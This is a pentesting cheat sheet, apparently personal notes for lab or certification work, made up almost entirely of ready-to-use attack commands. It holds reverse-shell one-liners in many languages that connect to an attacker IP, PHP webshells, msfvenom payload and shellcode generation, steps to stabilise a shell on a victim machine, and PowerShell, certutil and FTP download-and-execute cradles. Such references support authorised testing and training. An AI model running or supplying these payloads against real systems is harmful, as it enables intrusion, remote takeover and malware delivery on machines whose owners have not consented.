## One-Liners

```
# bash
/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.10.10/443 0>&1"

# Perl
perl -e 'use Socket;$i="10.10.10.10";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("10.10.10.10",443);exec("/bin/sh -i &3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.10.10",443).to_i;exec sprintf("/bin/sh -i &%d 2>&%d",f,f,f)'

# Netcat : -u for UDP
nc [-u] 10.10.10.10 443 -e /bin/bash

# Netcat without -e : -u for UDP
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc [-u] 10.10.10.10 443 > /tmp/f

# Java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5/dev/tcp/10.10.10.10/443;cat &5 >&5; done"] as String[])
p.waitFor()
```

## Windows
```
# PowerShell
cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
vi shell.ps1
# go to end of file, paste the following
Invoke-PowerShellTcp -Reverse -IPAddress [attacker_ip] -Port [attacker_port]
# close, reverse shell ready to use

# Netcat - use x64 or x32 as per target. powershell.exe or cmd.exe
nc.exe x.x.x.x <port> -e powershell.exe

```

## PHP Webshells
```
# Basic. system() or shell_exec() or exec()
<?php system($_GET['cmd']);?>

# More functional
<?php
$ip = 'http://10.10.14.4/' # [:port] . Change this
# Upload
if (isset($_GET['fupload'])) {
    file_put_contents($_GET['fupload'], file_get_contents($ip . $_GET['fupload']));
};
# Execute code
# shell_exec() or system() or exec()
if (isset($_GET['cmd'])) {
    echo "<pre>" . exec($_GET['cmd']) . "</pre>";
};
?>

```
## MSFvenom
### System Binaries
```
# Linux reverse shell - Staged
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell
# Linux reverse shell - Stageless
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f elf > shell

# Windows reverse shell - Staged
msfvenom -p windows/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe
# Windows reverse shell - Stageless
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o reverse.exe

```
### Web
```
# PHP
msfvenom -p php/reverse_php 

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f aspx -o shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f raw -o shell.jsp

# WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war -o shell.war

```

### Shellcode
```
# Linux Staged - use python or c
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f python
# Linux Stageless - use python or c
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python

# Windows Staged - use python or c
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<ip> LPORT=<port> -f python
# Windows Stageless - use python or c
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f python
```
## Upgrading Your Shell
```
# On victim machine
which python[3]
python[3] -c 'import pty;pty.spawn("/bin/bash")'
# background the listener using ctrl+z
stty -a # notice the number of rows and columns
stty raw -echo
# foreground the process: type fg, press enter
stty rows xx
stty columns xxx
export TERM=xterm-256color
```
## File Transfers
### Server
```
# HTTP - Apache2
# cp file /var/www/html/file_name
sudo service apache2 start

# HTTP - Python. Default port 8000
# python2
sudo python -m SimpleHTTPServer 80
# python3
sudo python3 -m http.server 80

# SMB
sudo impacket-smbserver <share_name> <path/to/share>

# FTP
# apt-get install python-pyftpdlib
sudo python -m pyftpdlib -p 21

# TFTP (UDP)
sudo atftpd --daemon -port 69 /path/to/serve

# Netcat
nc -nvlp <port> < file/to/send

```
### Linux - HTTP
```
# Wget
wget http://<ip>/file_name -O /path/to/save/file

# Netcat
nc -nv <ip> <port> > file/to/recv

# cURL
curl http://<ip>/file_name --output file_name
```
### Windows
```
# Does not save file on the system
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ip>/<file_name>')"
# Saves file on the system
powershell.exe -nop -ep bypass -c "iwr -uri http://<ip>/<file_name> -outfile path/to/save/file_name"
powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://<ip>/<file_name>','path/to/save/file_name')"

certutil.exe -urlcache -split -f http://<ip>/file file_save
```
### wget.ps1
```
echo $storageDir = $pwd >> wget.ps1
$webclient = New-Object System.Net.WebClient >> wget.ps1
# Download file from
$url = "http://<ip>/file_name" >> wget.ps1
# Save file as
$file = "file_name"
echo $webclient.DownloadFile($url,$file) >>wget.ps1
# execute the script as follows
powershell.exe -nop -ep bypass -nol -noni -f wget.ps1
```
### SMB
```# cmd.exe
net use Z: \\<attacker_ip>\share_name
# To access the drive
Z:
# PowerShell
New-PSDrive -Name "notmalicious" -PSProvider "FileSystem" -Root "\\attacker_ip\share_name"
# To access the drive
notmalicious:
```
### FTP
```
ftp <ip>
ftp>binary
ftp>get file_name

# One-liner downloader
# in cmd.exe do not use quotes in an echo command
echo open <ip> >> download.txt
echo anonymous >> download.txt
echo anon >> download.txt
echo binary >> download.txt
get file_name >> download.txt
bye >> download.txt
ftp -s:download.txt
```
